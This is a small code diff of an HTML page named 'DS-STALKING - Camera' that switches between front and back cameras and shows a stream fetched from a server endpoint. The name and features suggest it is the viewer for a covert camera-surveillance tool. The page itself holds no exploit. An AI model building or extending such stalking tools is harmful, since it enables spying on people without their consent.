@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DS-STALKING - Camera</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
 </head>
 <body>
     <h1>DS-STALKING - Camera</h1>
@@ -13,12 +12,9 @@
     <button onclick="changeCamera('back')">Caméra arrière</button>
 
     <h2>Flux Vidéo</h2>
-    <video id="video" width="640" height="480" controls autoplay></video>
+    <img id="video" width="640" height="480" />
 
     <script>
-        const socket = io(); // Connexion à SocketIO
-
-        // Fonction pour changer de caméra
         function changeCamera(cameraType) {
             fetch("/change_camera", {
                 method: "POST",
@@ -32,14 +28,14 @@
               }).catch(error => console.error(error));
         }
 
-        // Initialiser la vidéo à partir du lien généré
+        // Initialiser le flux vidéo
         fetch("/stream_link", {
             method: "POST"
         })
         .then(response => response.json())
         .then(data => {
-            const video = document.getElementById('video');
-            video.src = data.stream_url;
+            const videoElement = document.getElementById('video');
+            videoElement.src = data.stream_url;
         }).catch(error => console.error(error));
     </script>
 </body>
